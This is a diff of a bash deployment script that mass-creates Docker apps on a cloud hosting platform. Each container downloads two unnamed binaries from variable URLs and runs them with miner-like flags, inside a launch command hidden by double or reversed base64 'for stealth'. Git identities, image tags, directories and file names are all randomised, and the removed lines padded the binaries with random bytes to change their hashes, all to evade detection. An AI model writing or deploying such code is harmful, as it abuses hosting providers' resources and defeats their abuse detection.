@@ -1,5 +1,5 @@
 #!/bin/bash
-# /docker - Using --alias correctly with unique git config, unique directory, and unique WORKDIR
+# /docker - Fixed deployment with correct paths and app creation
 
 set -e
 
@@ -29,8 +29,12 @@ for i in 1 2 3; do
     UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
     APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
-    # ============ UNIQUE WORKDIR FOR DOCKERFILE (no common prefix) ============
+    # ============ UNIQUE WORKDIR FOR DOCKERFILE ============
     UNIQUE_WORKDIR="/$(rand_str 15)"
+    
+    # ============ UNIQUE BINARY NAMES ============
+    BIN1="$(rand_str 10)"
+    BIN2="$(rand_str 10)"
     
     # ============ UNIQUE APP NAME ============
     APP_NAME="app_$(rand_str 8)_$(date +%s)_${RANDOM}"
@@ -41,9 +45,10 @@ for i in 1 2 3; do
     echo "========================================="
     echo "📁 Directory: ${UNIQUE_DIR}"
     echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
+    echo "📦 Binary1: ${UNIQUE_WORKDIR}/${BIN1}"
+    echo "📦 Binary2: ${UNIQUE_WORKDIR}/${BIN2}"
     echo "📧 Git Email: ${GIT_EMAIL}"
     echo "👤 Git Name: ${GIT_NAME}"
-    echo "📝 Commit: ${GIT_COMMIT_MSG}"
     echo "🚀 App Name: ${APP_NAME}"
     echo "========================================="
     
@@ -58,16 +63,14 @@ for i in 1 2 3; do
     SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 -w 0)
     WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 -w 0)
     
-    # Generate random variable names (changes every run)
+    # Generate random variable names
     VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
     VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
     VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
     VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
     VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR6=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR7=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
     
-    # Generate random values (changes every run)
+    # Generate random values
     VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
     VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
     VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
@@ -76,43 +79,62 @@ for i in 1 2 3; do
     
     # Pool of working Debian and Ubuntu images
     WORKING_IMAGES=(
-        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
-        "ubuntu:noble" "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4"
-        "ubuntu:20.04.5" "ubuntu:20.04.6" "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3"
-        "ubuntu:22.04.4" "ubuntu:22.04.5" "ubuntu:22.04.6" "ubuntu:24.04.1" "ubuntu:24.04.2"
-        "debian:bookworm" "debian:bullseye" "debian:12" "debian:11" "debian:bookworm-slim"
-        "debian:bullseye-slim" "debian:12-slim" "debian:11-slim" "debian:12.0" "debian:11.0"
-        "debian:11.1" "debian:11.2" "debian:11.3" "debian:11.4" "debian:11.5"
-        "debian:11.6" "debian:11.7" "debian:11.8" "debian:11.9" "debian:11.10"
-        "debian:12.1" "debian:12.2" "debian:12.3" "debian:12.4" "debian:12.5"
-        "debian:12.6" "debian:12.7" "debian:12.8" "debian:12.9" "debian:stable"
-        "debian:testing" "debian:bookworm-backports" "debian:bullseye-backports"
+        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
+        "debian:11" "debian:12" "debian:bookworm"
     )
     
     # Pick random image
     RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
     
-    # Compatible package installation (works on both Debian and Ubuntu)
-    COMPLETE_COMMAND="${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENCODED}' | base64 -d) && ${VAR7}=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 || apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-traditional iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && dd if=/dev/urandom of=\${${VAR1}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && dd if=/dev/urandom of=\${${VAR2}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && exec ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}}"
+    # Create start.sh content with FULL PATHS to binaries
+    START_SCRIPT_CONTENT="#!/bin/bash
+set -e
+
+cd ${UNIQUE_WORKDIR}
+
+export DEBIAN_FRONTEND=noninteractive
+export TZ=Etc/UTC
+ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime
+apt-get update -qq
+apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata || true
+sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf
+echo 'ServerName localhost' >> /etc/apache2/apache2.conf
+
+# Download binaries to WORKDIR with full paths
+wget -q -O ${BIN1} \"${SOCAT_URL}\"
+wget -q -O ${BIN2} \"${WEB8888_URL}\"
+chmod 777 ${BIN1} ${BIN2}
+
+# Start socat daemon from WORKDIR
+(${UNIQUE_WORKDIR}/${BIN1} --daemon --port 8080 &)
+
+# Start apache
+service apache2 start
+
+sleep 5
+
+# Execute web8888 from WORKDIR with full path
+exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAL3} -o ${VAL4} -u ${VAL5} --port 8080"
+
+    # Encode the start script to base64
+    START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_CONTENT" | base64 -w 0)
     
-    # Encode the entire command to ONE base64 string
-    ONE_BASE64=$(echo -n "$COMPLETE_COMMAND" | base64 -w 0)
-    
-    # Randomly add an extra encoding layer for more stealth
+    # Random encoding layer
     if [ $((RANDOM % 2)) -eq 0 ]; then
-        ONE_BASE64=$(echo -n "$ONE_BASE64" | base64 -w 0)
+        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | base64 -w 0)
         DECODE_CMD="base64 -d | base64 -d"
     else
-        ONE_BASE64=$(echo -n "$ONE_BASE64" | rev)
+        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | rev)
         DECODE_CMD="rev | base64 -d"
     fi
     
-    # Create Dockerfile with random image and UNIQUE WORKDIR (no common prefix)
+    # Create Dockerfile with unique WORKDIR
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
         cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
 WORKDIR ${UNIQUE_WORKDIR}
-CMD eval "\$(echo '${ONE_BASE64}' | ${DECODE_CMD} | bash)"
+RUN apt-get update && apt-get install -y curl wget ca-certificates
+CMD echo '${START_SCRIPT_BASE64}' | ${DECODE_CMD} | bash
 EOF
     else
         cat > Dockerfile << EOF
@@ -122,23 +144,28 @@ CMD /bin/bash /start
 EOF
     fi
     
-    echo "✅ Dockerfile created with WORKDIR: ${UNIQUE_WORKDIR}"
+    echo "✅ Dockerfile created"
+    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
+    echo "📦 Binary paths: ${UNIQUE_WORKDIR}/${BIN1} and ${UNIQUE_WORKDIR}/${BIN2}"
     
-    # Git setup with UNIQUE config for THIS deployment
+    # Git setup
     git init
     git add .
     git commit -m "$GIT_COMMIT_MSG"
     
-    # Create and deploy
-    echo "Creating app on Clever Cloud..."
+    # FIRST: Create the app
+    echo "Creating app: ${APP_NAME}"
     clever create --type docker "$APP_NAME"
     
+    # SECOND: Deploy the app
     echo "Deploying $APP_NAME..."
-    clever deploy --alias "$APP_NAME"
+    clever deploy
     
-    echo "[$i/3] ✅ https://$APP_NAME.osc-fr1.scalingo.io"
-    echo "📁 Deployed from: ${APP_DIR}"
-    echo "📂 Container WORKDIR: ${UNIQUE_WORKDIR}"
+    if [ $? -eq 0 ]; then
+        echo "✅ App $i/3 deployed: https://$APP_NAME.osc-fr1.scalingo.io"
+    else
+        echo "❌ App $i/3 deployment failed"
+    fi
     
     cd /
     rm -rf "$APP_DIR"
